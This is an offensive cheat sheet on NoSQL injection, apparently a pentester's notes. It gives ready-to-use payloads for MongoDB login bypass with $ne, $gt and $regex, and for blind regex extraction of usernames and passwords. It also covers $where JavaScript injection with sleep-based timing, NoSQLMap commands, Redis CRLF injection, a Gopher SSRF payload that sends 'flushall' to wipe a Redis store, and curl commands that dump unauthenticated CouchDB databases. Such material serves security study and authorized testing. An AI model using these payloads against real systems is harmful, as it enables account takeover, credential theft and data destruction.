# NoSQL Injection

#NoSQLi #NoSQL #injection #WebAppAttacks #MongoDB

## What Is NoSQL Injection

NoSQL databases (MongoDB, Redis, CouchDB, Cassandra) don't use SQL — they use operator-based query languages. Injection occurs when user input is parsed as query operators rather than data values.

**Most common target: MongoDB** — widely used, operator injection is well-understood.

**Key difference from SQLi:** Instead of breaking out of string quotes, you inject JSON operators like `$ne`, `$gt`, `$regex` to change query logic.

---

## MongoDB Operator Reference

| Operator | Meaning | Injection use |
|----------|---------|---------------|
| `$ne` | Not equal | Bypass equality checks |
| `$gt` | Greater than | Match anything `> ""` |
| `$lt` | Less than | Match anything `< "z"` |
| `$gte` | Greater than or equal | |
| `$regex` | Regex match | Extract data character by character |
| `$where` | JS expression | JS injection (if enabled) |
| `$exists` | Field exists | Enumerate fields |
| `$nin` | Not in array | Bypass blocklists |

---

## Detection

**Test if app uses MongoDB / NoSQL:**
- JSON body in requests (`Content-Type: application/json`)
- URL params that accept objects: `?user=admin&pass=password`
- Error messages mentioning MongoDB, Mongoose, BSON
- Response changes when sending `'`, `"`, `{`, `}`

**Basic probes:**

```
'
"
{
{"$gt": ""}
{"$ne": null}
```

If the app crashes or returns unexpected output on `{` or `$ne` → likely NoSQL.

---

## Authentication Bypass

### JSON body injection (most common)

Normal login request:
```json
{"username": "admin", "password": "secret"}
```

**Inject operators to bypass password check:**

```json
{"username": "admin", "password": {"$ne": null}}
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

**Get first user in DB (no username needed):**
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

**Regex match — bypass with partial username:**
```json
{"username": {"$regex": "admin.*"}, "password": {"$ne": null}}
```

### URL parameter / form injection

If the app uses `user=admin&pass=secret` format, inject PHP/Express array notation:

```
# URL parameter operator injection
user=admin&pass[$ne]=invalid
user[$ne]=invalid&pass[$ne]=invalid
user[$gt]=&pass[$gt]=

# Or with brackets in URL
POST /login
user[%24ne]=invalid&pass[%24ne]=invalid
```

**In Burp — change Content-Type and body:**

```http
POST /login HTTP/1.1
Content-Type: application/json

{"username": {"$ne": null}, "password": {"$ne": null}}
```

---

## Data Extraction (Blind Boolean)

No direct UNION equivalent — extract data character by character using `$regex`.

### Extract usernames

```json
{"username": {"$regex": "^a"}, "password": {"$ne": null}}
{"username": {"$regex": "^ad"}, "password": {"$ne": null}}
{"username": {"$regex": "^adm"}, "password": {"$ne": null}}
{"username": {"$regex": "^admin"}, "password": {"$ne": null}}
```

True = login succeeds / app responds normally.
False = login fails / different response.

### Extract passwords

```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^s"}}
{"username": "admin", "password": {"$regex": "^se"}}
```

### Check field existence

```json
{"username": "admin", "email": {"$exists": true}}
{"username": "admin", "resetToken": {"$exists": true}}
```

### Enumerate all usernames

```json
{"username": {"$regex": "^a"}}   → if true, username starts with 'a'
{"username": {"$regex": "^b"}}   → else try 'b'
```

---

## JavaScript Injection (`$where`)

If MongoDB is configured with `$where` support (older versions):

```json
{"username": "admin", "$where": "this.password.length > 0"}
{"$where": "sleep(5000)"}
{"$where": "1==1"}
{"$where": "function() { return true; }"}
```

**Time-based blind via $where:**
```json
{"username": "admin", "$where": "if(this.password[0]=='a') { sleep(5000); return true; } else { return false; }"}
```

> `$where` is disabled by default in modern MongoDB. Worth trying on older boxes.

---

## NoSQLMap (Tool)

```bash
# Install
pip install nosqlmap
# or: git clone https://github.com/codingo/NoSQLMap

# Run interactive
python nosqlmap.py

# Direct scan
python nosqlmap.py -u http://target.com/login --attack 1
```

**Attack modes:**
- 1 = MongoDB server attack
- 2 = Web app NoSQLi
- 3 = Scan for MongoDB

---

## Burp Workflow

1. Intercept login request
2. Send to Repeater
3. If form body (`application/x-www-form-urlencoded`):
   - Change `Content-Type: application/json`
   - Rewrite body as JSON
   - Inject operators
4. If already JSON body:
   - Directly inject `{"$ne": null}` in value fields
5. Observe response difference (status code, body length, redirect)

**Intruder for regex brute:**
- Set payload position on the character being tested
- Payload list: `a-z`, `A-Z`, `0-9`, special chars
- Match on successful login response

---

## Redis Injection

Redis uses text-based commands. Injection occurs when user input is concatenated into Redis commands.

```bash
# Basic test — inject newline to add extra command
HGET users:* \r\nSET injected value\r\n

# If injectable in web param
?key=foo\r\nSET injected "pwned"\r\n

# If Redis SSRF via Gopher
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
```

**Common Redis attack via SSRF:**
```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A
```

---

## CouchDB Injection

CouchDB uses HTTP API with JSON. Injection via Mango query operators:

```json
{"selector": {"username": {"$gt": null}}}
{"selector": {"username": "admin", "password": {"$gt": ""}}}
```

**Direct API access (no auth if misconfigured):**
```bash
curl http://target.com:5984/_all_dbs
curl http://target.com:5984/users/_all_docs
curl http://target.com:5984/users/<doc_id>
```

---

## Filter Bypasses

### Case sensitivity (MongoDB operators are case-sensitive — `$NE` doesn't work)

### URL encoding operators
```
$ne → %24ne
$gt → %24gt
```

### Nested operator injection
```json
{"username": {"$not": {"$size": 0}}, "password": {"$ne": null}}
```

### Array injection
```json
{"username": ["admin", {"$gt": ""}], "password": {"$ne": null}}
```

---

## Quick Reference Checklist

```
1. Identify NoSQL indicators
   - JSON body, MongoDB errors, Mongoose in stack traces
   - URL params accepting object-like values

2. Probe for injection
   - Send ' " { to trigger errors
   - Send {"$ne": null} as a value

3. Auth bypass
   - {"username": "admin", "password": {"$ne": null}}
   - {"username": {"$ne": null}, "password": {"$ne": null}}
   - URL params: pass[$ne]=invalid

4. Extract data (blind regex)
   - {"username": {"$regex": "^a"}} — true/false on each char
   - Work through username, then password

5. Check $where (JS injection)
   - {"$where": "sleep(5000)"} — time-based blind
   - Only works on older/misconfigured MongoDB

6. Automate
   - NoSQLMap for scan + exploit
   - Burp Intruder for regex brute force

7. Other stores
   - Redis: check for SSRF + Gopher, newline injection
   - CouchDB: direct HTTP API access, Mango query injection
```
